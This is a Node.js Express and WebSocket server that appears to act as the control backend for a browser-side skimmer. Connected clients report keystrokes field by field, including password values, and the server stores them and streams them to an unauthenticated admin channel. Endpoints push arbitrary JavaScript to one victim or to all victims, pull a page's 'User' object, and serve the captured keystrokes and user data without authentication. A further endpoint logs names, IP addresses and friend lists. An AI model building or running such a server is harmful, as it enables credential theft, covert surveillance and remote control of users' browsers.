const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 8080;
const app = express();
app.use(cors());
app.use(express.json());

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const clients = new Map();
let clientIdCounter = 0;
const commandHistory = [];
const userDataStore = {};
const messageLog = [];
const keystrokeStore = {}; // clientId -> { fieldId -> { value, meta, ts } }

wss.on('connection', (ws, req) => {
    // Admin connection
    if (req.url === '/?admin=true') {
        adminClients.add(ws);

        ws.on('close', () => adminClients.delete(ws));
        ws.on('error', () => adminClients.delete(ws));

        const clientList = [];
        for (const [w, info] of clients) {
            if (!info.isAdmin) {
                clientList.push({
                    ...info,
                    userData: userDataStore[info.id] || null,
                    keystrokes: keystrokeStore[info.id] || {}
                });
            }
        }
        ws.send(JSON.stringify({
            type: 'init',
            clients: clientList,
            commandHistory: commandHistory.slice(-50),
            messageLog: messageLog.slice(-100)
        }));
        return;
    }

    // Regular client connection
    const clientId = ++clientIdCounter;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';

    const clientInfo = {
        id: clientId,
        ip,
        userAgent,
        connectedAt: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        messageCount: 0,
        origin: req.headers['origin'] || 'Unknown'
    };

    clients.set(ws, clientInfo);
    keystrokeStore[clientId] = {};
    console.log(`Client #${clientId} connected from ${ip}`);

    broadcastToAdmins({
        type: 'client_connected',
        client: clientInfo,
        totalClients: clients.size
    });

    ws.on('message', (message) => {
        const msgStr = message.toString();
        clientInfo.lastSeen = new Date().toISOString();
        clientInfo.messageCount++;

        if (msgStr === 'ping') return;

        let parsed = null;
        try { parsed = JSON.parse(msgStr); } catch (e) {}

        // Handle keystroke messages separately
        if (parsed && parsed.type === 'keystroke') {
            const fieldKey = parsed.fieldId + '_' + parsed.fieldType;
            keystrokeStore[clientId][fieldKey] = {
                fieldId: parsed.fieldId,
                fieldType: parsed.fieldType,
                placeholder: parsed.placeholder,
                label: parsed.label,
                isPassword: parsed.isPassword,
                value: parsed.value,
                length: parsed.length,
                url: parsed.url,
                title: parsed.title,
                updatedAt: new Date().toISOString()
            };

            broadcastToAdmins({
                type: 'keystroke',
                clientId,
                fieldKey,
                field: keystrokeStore[clientId][fieldKey]
            });
            return; // Don't log keystrokes as regular messages
        }

        const logEntry = {
            clientId,
            timestamp: new Date().toISOString(),
            raw: msgStr.substring(0, 5000),
            parsed
        };

        messageLog.push(logEntry);
        if (messageLog.length > 500) messageLog.shift();

        if (parsed) {
            userDataStore[clientId] = {
                data: parsed,
                receivedAt: new Date().toISOString()
            };
        }

        broadcastToAdmins({
            type: 'client_message',
            clientId,
            data: parsed || msgStr,
            timestamp: logEntry.timestamp
        });

        console.log(`Client #${clientId}: ${msgStr.substring(0, 200)}`);
    });

    ws.on('close', () => {
        console.log(`Client #${clientId} disconnected`);
        broadcastToAdmins({
            type: 'client_disconnected',
            clientId,
            totalClients: clients.size - 1
        });
        clients.delete(ws);
    });

    ws.on('error', (err) => {
        console.error(`Client #${clientId} error:`, err.message);
        clients.delete(ws);
    });
});

const adminClients = new Set();

function broadcastToAdmins(data) {
    const msg = JSON.stringify(data);
    for (const aws of adminClients) {
        if (aws.readyState === WebSocket.OPEN) aws.send(msg);
    }
}

app.get('/api/broadcast-js', (req, res) => {
    const { script } = req.query;
    if (typeof script !== 'string') return res.status(400).json({ error: "Missing ?script=" });

    let sentCount = 0;
    for (const [ws, info] of clients) {
        if (ws.readyState === WebSocket.OPEN && !info.isAdmin) {
            ws.send(script);
            sentCount++;
        }
    }

    commandHistory.push({ script, sentTo: sentCount, timestamp: new Date().toISOString() });
    if (commandHistory.length > 200) commandHistory.shift();

    broadcastToAdmins({ type: 'command_sent', script, sentTo: sentCount, timestamp: new Date().toISOString() });
    return res.json({ status: 'ok', sentTo: sentCount });
});

app.get('/api/send-to', (req, res) => {
    const { id, script } = req.query;
    if (!id || !script) return res.status(400).json({ error: "Missing ?id= or ?script=" });

    const targetId = parseInt(id);
    let sent = false;

    for (const [ws, info] of clients) {
        if (info.id === targetId && ws.readyState === WebSocket.OPEN) {
            ws.send(script);
            sent = true;
            break;
        }
    }

    return res.json({ status: sent ? 'ok' : 'client_not_found', clientId: targetId });
});

app.get('/api/clients', (req, res) => {
    const list = [];
    for (const [ws, info] of clients) {
        if (!info.isAdmin) {
            list.push({
                ...info,
                readyState: ws.readyState,
                userData: userDataStore[info.id] || null,
                keystrokes: keystrokeStore[info.id] || {}
            });
        }
    }
    return res.json(list);
});

app.get('/api/userdata', (req, res) => res.json(userDataStore));
app.get('/api/history', (req, res) => res.json(commandHistory));
app.get('/api/messages', (req, res) => {
    const limit = parseInt(req.query.limit) || 100;
    return res.json(messageLog.slice(-limit));
});
app.get('/api/keystrokes', (req, res) => res.json(keystrokeStore));

app.get('/api/request-user-info', (req, res) => {
    const script = 'window.postMessage({ action: "sendToWS", message: JSON.stringify(typeof User !== "undefined" ? User : {error:"User not defined"}) }, "*");';
    let sentCount = 0;
    for (const [ws, info] of clients) {
        if (ws.readyState === WebSocket.OPEN && !info.isAdmin) {
            ws.send(script);
            sentCount++;
        }
    }
    return res.json({ status: 'ok', sentTo: sentCount });
});

app.get('/screenshot.png', (req, res) => {
    if (fs.existsSync('screenshot.png')) res.sendFile(path.join(__dirname, 'screenshot.png'));
    else res.status(404).send('No screenshot found');
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'dashboard.html')));

// ─── messages.json helpers ───────────────────────────────────────────────────
const MESSAGES_FILE = path.join('/data', 'messages.json');

function readMessagesFromFile() {
    try {
        if (!fs.existsSync(MESSAGES_FILE)) return { messages: [] };
        const data = fs.readFileSync(MESSAGES_FILE, 'utf8');
        return JSON.parse(data);
    } catch (e) {
        return { messages: [] };
    }
}

function writeMessagesToFile(messages) {
    try {
        fs.writeFileSync(MESSAGES_FILE, JSON.stringify(messages, null, 2));
    } catch (e) {
        console.error('Error writing messages to file:', e);
    }
}

const MY_SECRET_KEY = process.env.MY_SECRET_KEY;

// ─── /api/addMessage ─────────────────────────────────────────────────────────
app.get('/api/addMessage', (req, res) => {
    try {
        const { name, tank, info } = req.query;

        let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || null;
        if (ip) ip = ip.split(',')[0].trim();

        if (!name || !tank) {
            return res.status(400).json({ error: 'Both name and tank are required' });
        }

        const messages = readMessagesFromFile() || { messages: {} };
        if (!Array.isArray(messages.messages)) messages.messages = [];

        let parsedInfo;
        try { parsedInfo = JSON.parse(info); } catch (e) { parsedInfo = {}; }

        const existingIndex = messages.messages.findIndex(m => m.name === name);

        if (existingIndex !== -1) {
            const existing = messages.messages[existingIndex];

            if (typeof existing.tank !== 'string') existing.tank = '';
            if (!existing.tank.includes(tank)) {
                existing.tank += (existing.tank ? ', ' : '') + tank;
            }

            if (!existing.info || typeof existing.info !== 'object') existing.info = {};
            if (!parsedInfo || typeof parsedInfo !== 'object') parsedInfo = {};

            const oM = existing.info.messages || '';
            const oP = existing.info.patata || '';
            const oF = Array.isArray(existing.info.friends) ? existing.info.friends : [];

            const newFriends = parsedInfo?.info?.friends;
            const hasNewFriends = Array.isArray(newFriends) && newFriends.length > 0;

            if (oF.length < 1) {
                existing.info = parsedInfo;
            } else {
                if (hasNewFriends) {
                    existing.info = parsedInfo;
                } else {
                    existing.info = parsedInfo;
                    existing.info.friends = oF;
                }
            }

            if (oM) existing.info.messages = oM + (existing.info.messages || '');
            if (oP) existing.info.patata = oP + (existing.info.patata || '');

            existing.NoV = (existing.NoV || 0) + 1;

            if (typeof existing.ip !== 'string') existing.ip = '';
            if (ip && !existing.ip.includes(ip)) {
                existing.ip += (existing.ip ? ', ' : '') + ip;
            }

        } else {
            messages.messages.push({
                id: messages.messages.length + 1,
                NoV: 1,
                name,
                tank,
                ip,
                info: parsedInfo
            });
        }

        try {
            writeMessagesToFile(messages);
        } catch (e) {
            console.error(e);
            return res.status(500).json({ error: 'Failed to write file' });
        }

        return res.json({ message: 'Message added successfully' });

    } catch (e) {
        console.error(e);
        return res.status(500).json({ error: e.message });
    }
});

// ─── /api/viewMessages ───────────────────────────────────────────────────────
app.get('/api/viewMessages', (req, res) => {
    const apiKey = req.headers['authorization'] || req.query.key;
    if (apiKey !== MY_SECRET_KEY) {
        return res.status(403).json({ error: 'Unauthorized' });
    }
    const messages = readMessagesFromFile();
    return res.json({ messages: messages.messages });
});

// ─── /api/resetMessages ──────────────────────────────────────────────────────
app.get('/api/resetMessages', (req, res) => {
    writeMessagesToFile({ messages: [] });
    return res.json({ message: 'Messages reset successfully' });
});

server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
